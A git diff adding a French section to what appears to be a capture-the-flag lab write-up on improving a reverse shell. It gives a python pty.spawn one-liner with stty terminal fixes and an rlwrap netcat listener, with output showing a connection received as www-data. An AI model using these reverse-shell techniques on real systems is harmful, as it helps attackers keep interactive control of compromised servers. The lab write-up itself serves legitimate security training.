@@ -473,3 +473,33 @@ shell.php5
 
 $ 
 ```
+
+## Améliorer notre shell
+
+Généralement, on peut utiliser `python` pour obtenir un meilleur shell. Avec les commandes bash suivantes.
+
+```bash
+python -c "import pty;pty.spawn('/bin/bash')"
+[Ctrl+z]
+
+stty size (noter le nombre de lignes et colonnes)
+
+stty raw -echo
+fg
+stty columns [nb de colonnes]
+stty rows    [nb de lignes]
+export TERM=xterm-256color
+```
+
+__Néanmoins, `python` n'est pas présent sur la box__. À défaut, on peut utiliser `rlwrap` pour avoir un historique des commandes.
+
+```
+$ rlwrap nc -lvnp 9001
+Listening on 0.0.0.0 9001
+Connection received on 192.168.56.112 33325
+/bin/sh: can't access tty; job control turned off
+
+whoami
+www-data
+
+```
